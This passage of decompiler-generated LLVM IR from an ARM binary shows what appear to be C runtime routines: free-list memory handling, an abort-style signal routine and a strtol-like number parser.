dec_label_pc_129f8:                               ; preds = %dec_label_pc_129e8
  %v1_129f8 = add i32 %v1_129ec, 44
  %v3_129fc = icmp ult i32 %v2_129d0, %v1_129f8
  br i1 %v3_129fc, label %.thread2, label %bb

bb:                                               ; preds = %dec_label_pc_129f8
  store i32 %v2_129f0, i32* %v1_129d0, align 4
  %v1_12a08 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_12a08, i32* %r0.global-to-local, align 4
  ret i32 %v1_12a08

.thread2:                                         ; preds = %dec_label_pc_129f8
  %v1_12a10 = add i32 %v0_12a10, 4
  %v2_12a10 = inttoptr i32 %v1_12a10 to i32*
  %v3_12a10 = load i32, i32* %v2_12a10, align 4
  store i32 %v3_12a10, i32* %r2.global-to-local, align 4
  %v2_12a14 = icmp eq i32 %v3_12a10, 0
  br i1 %v2_12a14, label %.thread3, label %bb17

bb17:                                             ; preds = %.thread2
  %v2_12a18 = add i32 %v0_12a10, 8
  %v3_12a18 = inttoptr i32 %v2_12a18 to i32*
  %v4_12a18 = load i32, i32* %v3_12a18, align 4
  %v3_12a1c = add i32 %v3_12a10, 8
  %v4_12a1c = inttoptr i32 %v3_12a1c to i32*
  store i32 %v4_12a18, i32* %v4_12a1c, align 4
  %v0_12a20.pre = load i32, i32* %ip.global-to-local, align 4
  br label %.thread3

.thread3:                                         ; preds = %.thread2, %bb17
  %v0_12a20 = phi i32 [ %v0_12a10, %.thread2 ], [ %v0_12a20.pre, %bb17 ]
  %v1_12a20 = add i32 %v0_12a20, 8
  %v2_12a20 = inttoptr i32 %v1_12a20 to i32*
  %v3_12a20 = load i32, i32* %v2_12a20, align 4
  store i32 %v3_12a20, i32* %r2.global-to-local, align 4
  %v1_12a24 = add i32 %v0_12a20, 4
  %v2_12a24 = inttoptr i32 %v1_12a24 to i32*
  %v3_12a24 = load i32, i32* %v2_12a24, align 4
  %v2_12a28 = icmp eq i32 %v3_12a20, 0
  br i1 %v2_12a28, label %.thread4, label %bb18

bb18:                                             ; preds = %.thread3
  %v3_12a2c = add i32 %v3_12a20, 4
  %v4_12a2c = inttoptr i32 %v3_12a2c to i32*
  store i32 %v3_12a24, i32* %v4_12a2c, align 4
  br label %bb19

.thread4:                                         ; preds = %.thread3
  %v2_12a30 = load i32, i32* %lr.global-to-local, align 4
  %v3_12a30 = inttoptr i32 %v2_12a30 to i32*
  store i32 %v3_12a24, i32* %v3_12a30, align 4
  br label %bb19

bb19:                                             ; preds = %bb18, %.thread4
  %v5_12a34 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v5_12a34

dec_label_pc_12a38:                               ; preds = %dec_label_pc_129d0
  %v1_12a38 = add i32 %v0_12a10, 4
  %v2_12a38 = inttoptr i32 %v1_12a38 to i32*
  %v3_12a38 = load i32, i32* %v2_12a38, align 4
  store i32 %v3_12a38, i32* %ip.global-to-local, align 4
  %v2_12a3c = icmp eq i32 %v3_12a38, 0
  br i1 %v2_12a3c, label %dec_label_pc_12a3c.dec_label_pc_12a44.loopexit_crit_edge, label %dec_label_pc_129d0

dec_label_pc_12a3c.dec_label_pc_12a44.loopexit_crit_edge: ; preds = %dec_label_pc_12a38
  br label %dec_label_pc_12a44

dec_label_pc_12a44:                               ; preds = %dec_label_pc_129e8, %dec_label_pc_129c0, %dec_label_pc_12a3c.dec_label_pc_12a44.loopexit_crit_edge, %dec_label_pc_129e4
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_12a38, { 1, 2, 0 }
  uselistorder i32 %v0_12a20, { 1, 0 }
  uselistorder i32 %v1_129ec, { 0, 2, 1, 3 }
  uselistorder i1 %v9_129dc, { 1, 0 }
  uselistorder i32 %v2_129d0, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v0_12a10, { 3, 2, 1, 0, 5, 4 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 4, 0 }
  uselistorder label %dec_label_pc_12a44, { 2, 0, 3, 1 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_129d0, { 1, 0 }
}

define i32 @function_12a4c() local_unnamed_addr {
dec_label_pc_12a4c:
  %v0_12a4c = load i32, i32* @r2, align 4
  %v2_12a4c = icmp eq i32 %v0_12a4c, 0
  %v0_12a50 = load i32, i32* @r3, align 4
  %v1_12a50 = load i32, i32* @r1, align 4
  %v2_12a50 = add i32 %v1_12a50, 4
  %v3_12a50 = inttoptr i32 %v2_12a50 to i32*
  store i32 %v0_12a50, i32* %v3_12a50, align 4
  %v0_12a54 = load i32, i32* @r2, align 4
  %v1_12a54 = load i32, i32* @r1, align 4
  %v2_12a54 = add i32 %v1_12a54, 8
  %v3_12a54 = inttoptr i32 %v2_12a54 to i32*
  store i32 %v0_12a54, i32* %v3_12a54, align 4
  %v1_12a5c = load i32, i32* @r1, align 4
  br i1 %v2_12a4c, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_12a4c
  %v2_12a58 = load i32, i32* @r2, align 4
  %v3_12a58 = add i32 %v2_12a58, 4
  %v4_12a58 = inttoptr i32 %v3_12a58 to i32*
  store i32 %v1_12a5c, i32* %v4_12a58, align 4
  br label %bb1

.thread:                                          ; preds = %dec_label_pc_12a4c
  %v2_12a5c = load i32, i32* @r0, align 4
  %v3_12a5c = inttoptr i32 %v2_12a5c to i32*
  store i32 %v1_12a5c, i32* %v3_12a5c, align 4
  br label %bb1

bb1:                                              ; preds = %bb, %.thread
  %v0_12a60 = load i32, i32* @r3, align 4
  %v2_12a60 = icmp eq i32 %v0_12a60, 0
  br i1 %v2_12a60, label %bb3, label %bb2

bb2:                                              ; preds = %bb1
  %v1_12a64 = load i32, i32* @r1, align 4
  %v3_12a64 = add i32 %v0_12a60, 8
  %v4_12a64 = inttoptr i32 %v3_12a64 to i32*
  store i32 %v1_12a64, i32* %v4_12a64, align 4
  br label %bb3

bb3:                                              ; preds = %bb1, %bb2
  %v1_12a68 = load i32, i32* @r0, align 4
  ret i32 %v1_12a68

; uselistorder directives
  uselistorder i32 %v1_12a5c, { 1, 0 }
  uselistorder label %bb3, { 1, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @function_12a6c() local_unnamed_addr {
dec_label_pc_12a6c:
  %v0_12a6c = load i32, i32* @r2, align 4
  %v2_12a6c = icmp eq i32 %v0_12a6c, 0
  %v1_12a70 = load i32, i32* @r1, align 4
  br i1 %v2_12a6c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_12a6c
  %v2_12a70 = load i32, i32* @r0, align 4
  %v3_12a70 = inttoptr i32 %v2_12a70 to i32*
  store i32 %v1_12a70, i32* %v3_12a70, align 4
  br label %bb2

.thread:                                          ; preds = %dec_label_pc_12a6c
  %v3_12a74 = add i32 %v0_12a6c, 4
  %v4_12a74 = inttoptr i32 %v3_12a74 to i32*
  store i32 %v1_12a70, i32* %v4_12a74, align 4
  br label %bb2

bb2:                                              ; preds = %bb, %.thread
  %v0_12a78 = load i32, i32* @r2, align 4
  %v1_12a78 = load i32, i32* @r1, align 4
  %v2_12a78 = add i32 %v1_12a78, 8
  %v3_12a78 = inttoptr i32 %v2_12a78 to i32*
  store i32 %v0_12a78, i32* %v3_12a78, align 4
  %v1_12a7c = load i32, i32* @r0, align 4
  ret i32 %v1_12a7c

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @function_12a80(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_12a80:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_12a80 = load i32, i32* @r4, align 4
  store i32 %v3_12a80, i32* %stack_var_-20, align 4
  %v2_12a84 = load i32, i32* %arg1, align 4
  store i32 %v2_12a84, i32* %r4.global-to-local, align 4
  %v2_12a88 = add i32 %arg3, %arg2
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_12aa42 = icmp eq i32 %v2_12a84, 0
  br i1 %v2_12aa42, label %dec_label_pc_12b54, label %dec_label_pc_12a94

dec_label_pc_12a94:                               ; preds = %dec_label_pc_12a80, %dec_label_pc_12a9c
  %v0_12ae4 = phi i32 [ %v0_12aec, %dec_label_pc_12a9c ], [ 0, %dec_label_pc_12a80 ]
  %v0_12aec = phi i32 [ %v3_12aa0, %dec_label_pc_12a9c ], [ %v2_12a84, %dec_label_pc_12a80 ]
  %v1_12aa85.in = phi i32 [ %v3_12aa0, %dec_label_pc_12a9c ], [ %v2_12a84, %dec_label_pc_12a80 ]
  %v1_12aa85 = add i32 %v1_12aa85.in, 12
  %v3_12a94 = icmp ult i32 %v1_12aa85, %arg2
  br i1 %v3_12a94, label %dec_label_pc_12a9c, label %dec_label_pc_12ab4

dec_label_pc_12a9c:                               ; preds = %dec_label_pc_12a94
  store i32 %v0_12aec, i32* %r6.global-to-local, align 4
  %v1_12aa0 = add i32 %v0_12aec, 4
  %v2_12aa0 = inttoptr i32 %v1_12aa0 to i32*
  %v3_12aa0 = load i32, i32* %v2_12aa0, align 4
  store i32 %v3_12aa0, i32* %r4.global-to-local, align 4
  %v2_12aa4 = icmp eq i32 %v3_12aa0, 0
  br i1 %v2_12aa4, label %dec_label_pc_12aa4.dec_label_pc_12b54.loopexit_crit_edge, label %dec_label_pc_12a94

dec_label_pc_12ab4:                               ; preds = %dec_label_pc_12a94
  %v1_12ab4 = inttoptr i32 %v0_12aec to i32*
  %v2_12ab4 = load i32, i32* %v1_12ab4, align 4
  %v2_12ab8 = sub i32 %v0_12aec, %v2_12ab4
  %v1_12abc = add i32 %v2_12ab8, 12
  %v3_12ac0 = icmp uge i32 %v1_12abc, %v2_12a88
  %v9_12ac0 = icmp eq i32 %v1_12abc, %v2_12a88
  %v2_12ac4 = xor i1 %v9_12ac0, true
  %v3_12ac4 = and i1 %v3_12ac0, %v2_12ac4
  br i1 %v3_12ac4, label %dec_label_pc_12b54, label %dec_label_pc_12ac8

dec_label_pc_12ac8:                               ; preds = %dec_label_pc_12ab4
  %v2_12ac8 = add i32 %v2_12ab4, %arg3
  store i32 %v2_12ac8, i32* %r7.global-to-local, align 4
  br i1 %v9_12ac0, label %dec_label_pc_12ad0, label %dec_label_pc_12afc

dec_label_pc_12ad0:                               ; preds = %dec_label_pc_12ac8
  %v2_12ad0 = icmp eq i32 %v0_12ae4, 0
  br i1 %v2_12ad0, label %dec_label_pc_12b48, label %dec_label_pc_12ad8

dec_label_pc_12ad8:                               ; preds = %dec_label_pc_12ad0
  %v1_12ad8 = add i32 %v0_12ae4, 12
  %v9_12adc = icmp eq i32 %v1_12ad8, %arg2
  br i1 %v9_12adc, label %dec_label_pc_12ae4, label %dec_label_pc_12b48

dec_label_pc_12ae4:                               ; preds = %dec_label_pc_12ad8
  %v1_12ae4 = inttoptr i32 %v0_12ae4 to i32*
  %v2_12ae4 = load i32, i32* %v1_12ae4, align 4
  %v1_12ae8 = add i32 %v0_12ae4, 8
  %v2_12ae8 = inttoptr i32 %v1_12ae8 to i32*
  %v3_12ae8 = load i32, i32* %v2_12ae8, align 4
  store i32 %v3_12ae8, i32* @r2, align 4
  store i32 %v0_12aec, i32* @r1, align 4
  %v2_12af0 = add i32 %v2_12ae4, %v2_12ac8
  store i32 %v2_12af0, i32* %r7.global-to-local, align 4
  %v0_12af4 = call i32 @function_12a6c()
  br label %dec_label_pc_12b48

dec_label_pc_12afc:                               ; preds = %dec_label_pc_12ac8
  %v1_12afc = add i32 %v0_12aec, 4
  %v2_12afc = inttoptr i32 %v1_12afc to i32*
  %v3_12afc = load i32, i32* %v2_12afc, align 4
  store i32 %v3_12afc, i32* %r5.global-to-local, align 4
  %v2_12b00 = icmp eq i32 %v3_12afc, 0
  br i1 %v2_12b00, label %dec_label_pc_12b34, label %dec_label_pc_12b08

dec_label_pc_12b08:                               ; preds = %dec_label_pc_12afc
  %v1_12b08 = inttoptr i32 %v3_12afc to i32*
  %v2_12b08 = load i32, i32* %v1_12b08, align 4
  %v2_12b0c = sub i32 %v3_12afc, %v2_12b08
  %v1_12b10 = add i32 %v2_12b0c, 12
  %v9_12b14 = icmp eq i32 %v2_12a88, %v1_12b10
  br i1 %v9_12b14, label %dec_label_pc_12b1c, label %dec_label_pc_12b34

dec_label_pc_12b1c:                               ; preds = %dec_label_pc_12b08
  store i32 %v0_12ae4, i32* @r2, align 4
  store i32 %v3_12afc, i32* @r1, align 4
  %v2_12b24 = add i32 %v2_12b08, %v2_12ac8
  store i32 %v2_12b24, i32* %r7.global-to-local, align 4
  %v0_12b28 = call i32 @function_12a6c()
  %v0_12b2c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_12b2c, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12b48

dec_label_pc_12b34:                               ; preds = %dec_label_pc_12b08, %dec_label_pc_12afc
  %v2_12b34 = add i32 %v0_12aec, %arg3
  store i32 %v2_12b34, i32* %r4.global-to-local, align 4
  store i32 %v3_12afc, i32* @r3, align 4
  store i32 %v0_12ae4, i32* @r2, align 4
  store i32 %v2_12b34, i32* @r1, align 4
  %v0_12b44 = call i32 @function_12a4c()
  br label %dec_label_pc_12b48

dec_label_pc_12b48:                               ; preds = %dec_label_pc_12ad8, %dec_label_pc_12ad0, %dec_label_pc_12b1c, %dec_label_pc_12ae4, %dec_label_pc_12b34
  %v0_12b48 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_12b48, i32* %r5.global-to-local, align 4
  %v0_12b4c = load i32, i32* %r7.global-to-local, align 4
  %v2_12b4c = inttoptr i32 %v0_12b48 to i32*
  store i32 %v0_12b4c, i32* %v2_12b4c, align 4
  br label %dec_label_pc_12b6c

dec_label_pc_12aa4.dec_label_pc_12b54.loopexit_crit_edge: ; preds = %dec_label_pc_12a9c
  br label %dec_label_pc_12b54

dec_label_pc_12b54:                               ; preds = %dec_label_pc_12a80, %dec_label_pc_12aa4.dec_label_pc_12b54.loopexit_crit_edge, %dec_label_pc_12ab4
  %v1_12b54 = add i32 %v2_12a88, -12
  store i32 %v1_12b54, i32* %r5.global-to-local, align 4
  %v3_12b58 = inttoptr i32 %v1_12b54 to i32*
  store i32 %arg3, i32* %v3_12b58, align 4
  %v0_12b5c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_12b5c, i32* @r3, align 4
  %v0_12b60 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_12b60, i32* @r2, align 4
  %v0_12b64 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_12b64, i32* @r1, align 4
  %v0_12b68 = call i32 @function_12a4c()
  br label %dec_label_pc_12b6c

dec_label_pc_12b6c:                               ; preds = %dec_label_pc_12b48, %dec_label_pc_12b54
  %v0_12b6c = load i32, i32* %r5.global-to-local, align 4
  %v2_12b70 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_12b70, i32* @r4, align 4
  ret i32 %v0_12b6c

; uselistorder directives
  uselistorder i32 %v3_12afc, { 0, 1, 3, 2, 4, 5 }
  uselistorder i1 %v9_12ac0, { 1, 0 }
  uselistorder i32 %v3_12aa0, { 2, 3, 1, 0 }
  uselistorder i32 %v0_12aec, { 0, 2, 1, 3, 4, 6, 7, 5 }
  uselistorder i32 %v0_12ae4, { 4, 5, 1, 0, 2, 3 }
  uselistorder i32* %r7.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* %r4.global-to-local, { 3, 4, 0, 1, 2, 5 }
  uselistorder i32 ()* @function_12a4c, { 1, 0 }
  uselistorder i32* @r3, { 5, 8, 6, 7, 0, 9, 10, 11, 1, 2, 3, 12, 4 }
  uselistorder i32 ()* @function_12a6c, { 1, 0 }
  uselistorder i32 %arg3, { 3, 0, 1, 2 }
  uselistorder i32 %arg2, { 1, 2, 0 }
  uselistorder label %dec_label_pc_12b6c, { 1, 0 }
  uselistorder label %dec_label_pc_12b54, { 1, 2, 0 }
  uselistorder label %dec_label_pc_12b48, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_12a94, { 1, 0 }
}

define i32 @function_12b74() local_unnamed_addr {
dec_label_pc_12b90.lr.ph:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %stack_var_-268 = alloca i32, align 4
  %v2_12b74 = ptrtoint i32* %stack_var_-268 to i32
  %v1_12b84 = call i32 @function_1310c()
  store i32 31, i32* %r1.global-to-local, align 4
  %v2_12b90 = ptrtoint i32* %stack_var_0 to i32
  br label %dec_label_pc_12b90

dec_label_pc_12b90:                               ; preds = %dec_label_pc_12b90.lr.ph, %dec_label_pc_12b90
  %v1_12b94 = phi i32 [ 31, %dec_label_pc_12b90.lr.ph ], [ %v1_12ba0, %dec_label_pc_12b90 ]
  %v4_12b94 = mul i32 %v1_12b94, 4
  %v5_12b94 = add i32 %v4_12b94, %v2_12b90
  %v2_12b9c = add i32 %v5_12b94, -128
  %v3_12b9c = inttoptr i32 %v2_12b9c to i32*
  store i32 0, i32* %v3_12b9c, align 4
  %v0_12ba0 = load i32, i32* %r1.global-to-local, align 4
  %v1_12ba0 = add i32 %v0_12ba0, -1
  store i32 %v1_12ba0, i32* %r1.global-to-local, align 4
  %v6_12ba0 = icmp slt i32 %v1_12ba0, 0
  br i1 %v6_12ba0, label %dec_label_pc_12ba8, label %dec_label_pc_12b90

dec_label_pc_12ba8:                               ; preds = %dec_label_pc_12b90
  %v2_12ba8 = ptrtoint i32* %stack_var_-128 to i32
  store i32 %v2_12ba8, i32* @r4, align 4
  store i32 %v2_12ba8, i32* @r0, align 4
  store i32 6, i32* @r1, align 4
  %v0_12bb4 = call i32 @function_12530()
  %v2_12bb8 = icmp eq i32 %v0_12bb4, 0
  br i1 %v2_12bb8, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_12ba8
  store i32 %v2_12ba8, i32* %r1.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_12ba8, %bb
  store i32 76748, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_12bb8, i32 ptrtoint (i32* @global_var_11d6c.416 to i32))
  %v2_12bd0 = load i32, i32* @global_var_1caf0.418, align 4
  %v2_12bd4 = icmp eq i32 %v2_12bd0, 0
  br i1 %v2_12bd4, label %dec_label_pc_12bdc, label %dec_label_pc_12c0c

dec_label_pc_12bdc:                               ; preds = %.thread1
  store i32 1, i32* @global_var_1caf0.418, align 4
  br label %dec_label_pc_12be4

dec_label_pc_12be4:                               ; preds = %dec_label_pc_12c5c, %dec_label_pc_12bdc
  %v1_12bf0 = call i32 @function_1310c()
  %v1_12bf8 = call i32 @function_1429c(i32 6)
  store i32 76812, i32* @lr, align 4
  %v1_12c08 = call i32 @function_1310c()
  %v2_12c10.pre = load i32, i32* @global_var_1caf0.418, align 4
  br label %dec_label_pc_12c0c

dec_label_pc_12c0c:                               ; preds = %.thread1, %dec_label_pc_12be4
  %v0_12c80 = phi i32 [ %v2_12bd0, %.thread1 ], [ %v2_12c10.pre, %dec_label_pc_12be4 ]
  store i32 ptrtoint (i32* @global_var_1caf0.418 to i32), i32* %ip.global-to-local, align 4
  %v7_12c14 = icmp eq i32 %v0_12c80, 1
  br i1 %v7_12c14, label %dec_label_pc_12c44.lr.ph, label %dec_label_pc_12c78

dec_label_pc_12c44.lr.ph:                         ; preds = %dec_label_pc_12c0c
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 140, i32* @r2, align 4
  store i32 2, i32* @global_var_1caf0.418, align 4
  %v2_12c30 = bitcast i32* %stack_var_-268 to i8*
  %v3_12c30 = call i32 @function_12130(i8* %v2_12c30, i32 0)
  store i32 0, i32* %stack_var_-268, align 4
  store i32 31, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12c44

dec_label_pc_12c44:                               ; preds = %dec_label_pc_12c44.lr.ph, %dec_label_pc_12c44
  %v1_12c48 = phi i32 [ 31, %dec_label_pc_12c44.lr.ph ], [ %v1_12c54, %dec_label_pc_12c44 ]
  %v4_12c48 = mul i32 %v1_12c48, 4
  %v5_12c48 = add i32 %v4_12c48, %v2_12b90
  %v2_12c50 = add i32 %v5_12c48, -264
  %v3_12c50 = inttoptr i32 %v2_12c50 to i32*
  store i32 -1, i32* %v3_12c50, align 4
  %v0_12c54 = load i32, i32* %r1.global-to-local, align 4
  %v1_12c54 = add i32 %v0_12c54, -1
  store i32 %v1_12c54, i32* %r1.global-to-local, align 4
  %v6_12c54 = icmp slt i32 %v1_12c54, 0
  br i1 %v6_12c54, label %dec_label_pc_12c5c, label %dec_label_pc_12c44

dec_label_pc_12c5c:                               ; preds = %dec_label_pc_12c44
  store i32 %v2_12b74, i32* %r1.global-to-local, align 4
  %v4_12c70 = call i32 @function_133f8(i32 6, i32* nonnull %stack_var_-268, i32 0)
  br label %dec_label_pc_12be4

dec_label_pc_12c78:                               ; preds = %dec_label_pc_12c0c
  %v7_12c78 = icmp eq i32 %v0_12c80, 2
  br i1 %v7_12c78, label %dec_label_pc_12c80, label %dec_label_pc_12c8c

dec_label_pc_12c80:                               ; preds = %dec_label_pc_12c78
  store i32 3, i32* @global_var_1caf0.418, align 4
  %v0_12c88 = call i32 @function_12b74()
  %v2_12c8c.pre = load i32, i32* @global_var_1caf0.418, align 4
  br label %dec_label_pc_12c8c

dec_label_pc_12c8c:                               ; preds = %dec_label_pc_12c78, %dec_label_pc_12c80
  %v1_12c94 = phi i32 [ %v0_12c80, %dec_label_pc_12c78 ], [ %v2_12c8c.pre, %dec_label_pc_12c80 ]
  %v7_12c90 = icmp eq i32 %v1_12c94, 3
  br i1 %v7_12c90, label %bb27, label %.thread3

bb27:                                             ; preds = %dec_label_pc_12c8c
  %v2_12c9c = load i32, i32* %ip.global-to-local, align 4
  %v3_12c9c = inttoptr i32 %v2_12c9c to i32*
  store i32 4, i32* %v3_12c9c, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_12c8c, %bb27
  call void @__pseudo_cond_branch(i1 %v7_12c90, i32 ptrtoint (i32* @global_var_13510.420 to i32))
  br label %dec_label_pc_12ca4

dec_label_pc_12ca4:                               ; preds = %dec_label_pc_12ca4, %.thread3
  %v0_12ca4 = call i32 @function_12b74()
  br label %dec_label_pc_12ca4

; uselistorder directives
  uselistorder i32 %v1_12c54, { 2, 1, 0 }
  uselistorder i32 %v1_12ba0, { 2, 1, 0 }
  uselistorder i32* %stack_var_-268, { 1, 2, 0, 3 }
  uselistorder i32* %r1.global-to-local, { 3, 4, 0, 1, 5, 6, 8, 7, 2 }
  uselistorder i32* @global_var_1caf0.418, { 1, 2, 0, 6, 3, 4, 5 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_12c8c, { 1, 0 }
  uselistorder label %dec_label_pc_12c44, { 1, 0 }
  uselistorder label %dec_label_pc_12c0c, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_12b90, { 1, 0 }
}

define i32 @function_12cbc(i8* %arg1) local_unnamed_addr {
dec_label_pc_12cbc:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-36 = alloca i32, align 4
  %v3_12cd0 = load i32, i32* @r4, align 4
  store i32 %v3_12cd0, i32* %stack_var_-36, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  store i32 10, i32* %r5.global-to-local, align 4
  store i32 1, i32* %fp.global-to-local, align 4
  %v2_12cf4.pre = load i32, i32* bitcast (i32** @global_var_1ca5c.423 to i32*), align 4
  br label %dec_label_pc_12cec

dec_label_pc_12cec:                               ; preds = %dec_label_pc_12cec, %dec_label_pc_12cbc
  %v0_12d24 = phi i32 [ %tmp, %dec_label_pc_12cbc ], [ %v1_12ce8, %dec_label_pc_12cec ]
  store i32 %v0_12d24, i32* %r4.global-to-local, align 4
  %v1_12cf0 = inttoptr i32 %v0_12d24 to i8*
  %v2_12cf0 = load i8, i8* %v1_12cf0, align 1
  %v3_12cf0 = zext i8 %v2_12cf0 to i32
  %v3_12cf8 = mul nuw nsw i32 %v3_12cf0, 2
  %v4_12cf8 = add i32 %v3_12cf8, %v2_12cf4.pre
  %v5_12cf8 = inttoptr i32 %v4_12cf8 to i8*
  %v6_12cf8 = load i8, i8* %v5_12cf8, align 1
  %v1_12cfc = and i8 %v6_12cf8, 32
  %v2_12cfc = icmp eq i8 %v1_12cfc, 0
  %v1_12ce8 = add i32 %v0_12d24, 1
  br i1 %v2_12cfc, label %dec_label_pc_12d04, label %dec_label_pc_12cec

dec_label_pc_12d04:                               ; preds = %dec_label_pc_12cec
  %v7_12d04 = icmp eq i8 %v2_12cf0, 43
  br i1 %v7_12d04, label %dec_label_pc_12d24, label %dec_label_pc_12d0c

dec_label_pc_12d0c:                               ; preds = %dec_label_pc_12d04
  %v7_12d0c = icmp eq i8 %v2_12cf0, 45
  br i1 %v7_12d0c, label %dec_label_pc_12d24, label %bb

bb:                                               ; preds = %dec_label_pc_12d0c
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_12d80

dec_label_pc_12d24:                               ; preds = %dec_label_pc_12d04, %dec_label_pc_12d0c
  %storemerge30 = phi i32 [ 1, %dec_label_pc_12d0c ], [ 0, %dec_label_pc_12d04 ]
  store i32 %storemerge30, i32* %r7.global-to-local, align 4
  store i32 %v1_12ce8, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12d80

dec_label_pc_12d80:                               ; preds = %bb, %dec_label_pc_12d24
  store i32 %tmp, i32* %r6.global-to-local, align 4
  %v2_12d88 = call i32 @function_11878(i32 -1, i32 10)
  %v0_12d8c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_12d8c, i32* @r1, align 4
  store i32 -1, i32* @r0, align 4
  %v1_12d98 = urem i32 %v2_12d88, 256
  store i32 %v1_12d98, i32* %sl.global-to-local, align 4
  %v0_12d9c = call i32 @function_11768()
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 %v0_12d9c, i32* %r8.global-to-local, align 4
  %v0_12db0.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12db0

dec_label_pc_12dac:                               ; preds = %bb48, %dec_label_pc_12e0c
  %v0_12dac = phi i32 [ %v1_12ddc, %bb48 ], [ %v0_12dac.pre, %dec_label_pc_12e0c ]
  store i32 %v0_12dac, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_12db0

dec_label_pc_12db0:                               ; preds = %dec_label_pc_12d80, %dec_label_pc_12dac
  %v0_12ddc = phi i32 [ %v0_12db0.pre, %dec_label_pc_12d80 ], [ %v0_12dac, %dec_label_pc_12dac ]
  %v1_12db0 = inttoptr i32 %v0_12ddc to i8*
  %v2_12db0 = load i8, i8* %v1_12db0, align 1
  %v3_12db0 = zext i8 %v2_12db0 to i32
  %v1_12db4 = add nsw i32 %v3_12db0, -48
  %v1_12db8 = urem i32 %v1_12db4, 256
  %v1_12dc0 = or i32 %v3_12db0, 32
  %tmp56 = icmp ult i32 %v1_12db8, 10
  br i1 %tmp56, label %bb43, label %dec_label_pc_12dc8

dec_label_pc_12dc8:                               ; preds = %dec_label_pc_12db0
  %tmp57 = icmp ugt i32 %v1_12dc0, 96
  br i1 %tmp57, label %bb42, label %bb43

bb42:                                             ; preds = %dec_label_pc_12dc8
  %v1_12dcc = add nsw i32 %v1_12dc0, -87
  %v5_12dd4 = urem i32 %v1_12dcc, 256
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_12db0, %dec_label_pc_12dc8, %bb42
  %v3_12e04 = phi i32 [ %v1_12db8, %dec_label_pc_12db0 ], [ 40, %dec_label_pc_12dc8 ], [ %v5_12dd4, %bb42 ]
  %v1_12dd8 = load i32, i32* %r5.global-to-local, align 4
  %v1_12ddc = add i32 %v0_12ddc, 1
  store i32 %v1_12ddc, i32* %r4.global-to-local, align 4
  %v6_12de0 = icmp slt i32 %v3_12e04, %v1_12dd8
  br i1 %v6_12de0, label %dec_label_pc_12de4, label %dec_label_pc_12e24

dec_label_pc_12de4:                               ; preds = %bb43
  %v0_12de4 = load i32, i32* %ip.global-to-local, align 4
  %v1_12de4 = load i32, i32* %r8.global-to-local, align 4
  %v9_12de4 = icmp eq i32 %v0_12de4, %v1_12de4
  br i1 %v9_12de4, label %.thread, label %bb44

.thread:                                          ; preds = %dec_label_pc_12de4
  br label %dec_label_pc_12df4

bb44:                                             ; preds = %dec_label_pc_12de4
  %v3_12de4 = icmp ult i32 %v0_12de4, %v1_12de4
  br i1 %v3_12de4, label %dec_label_pc_12df4, label %dec_label_pc_12e0c

dec_label_pc_12df4:                               ; preds = %bb44, %.thread
  %v4_12dfc1727 = phi i32 [ 1, %.thread ], [ 0, %bb44 ]
  %v1_12df4 = load i32, i32* %sl.global-to-local, align 4
  %v3_12df4 = icmp uge i32 %v3_12e04, %v1_12df4
  %v9_12df4 = icmp eq i32 %v3_12e04, %v1_12df4
  %v2_12df8 = xor i1 %v3_12df4, true
